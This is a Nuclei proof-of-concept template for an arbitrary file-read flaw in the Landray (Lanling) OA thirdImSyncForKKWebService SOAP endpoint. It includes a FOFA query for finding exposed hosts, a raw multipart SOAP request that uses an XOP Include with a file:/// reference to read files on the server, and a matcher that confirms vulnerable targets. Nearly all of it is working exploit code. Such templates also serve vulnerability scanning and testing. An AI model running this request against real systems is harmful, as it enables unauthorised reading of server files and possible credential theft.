poc/web/lanling-oa-thirdImSyncForKKWebService-fileread.yaml

id: lanling-oa-thirdImSyncForKKWebService-fileread

info:
  name: lanling-oa-thirdImSyncForKKWebService-fileread
  author: PokerSec
  severity: high
  metadata:
    fofasearch:  body="Com_Parameter"

variables:
  boundary: "{{to_lower(rand_base(20))}}"

http:
  - raw:
      - |
        POST /sys/webservice/thirdImSyncForKKWebService HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/related; boundary=----{{boundary}}
        SOAPAction: ""

        ------{{boundary}}
        Content-Disposition: form-data; name="a"

        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://webservice.kk.im.third.kmss.landray.com/">
        <soapenv:Header/>
        <soapenv:Body>
        <web:getTodo>
        <arg0>
        <otherCond>1</otherCond>
        <pageNo>1</pageNo>
        <rowSize>1</rowSize>
        <targets>1</targets>
        <type><xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="file:///"/></type>
        </arg0>
        </web:getTodo>
        </soapenv:Body>
        </soapenv:Envelope>
        ------{{boundary}}--

    matchers:
      - type: dsl
        dsl:
          - status_code==500 && contains_all(body,"<soap:Envelope") && contains_all(body,"<faultstring>") && contains_all(body,"Unmarshalling Error")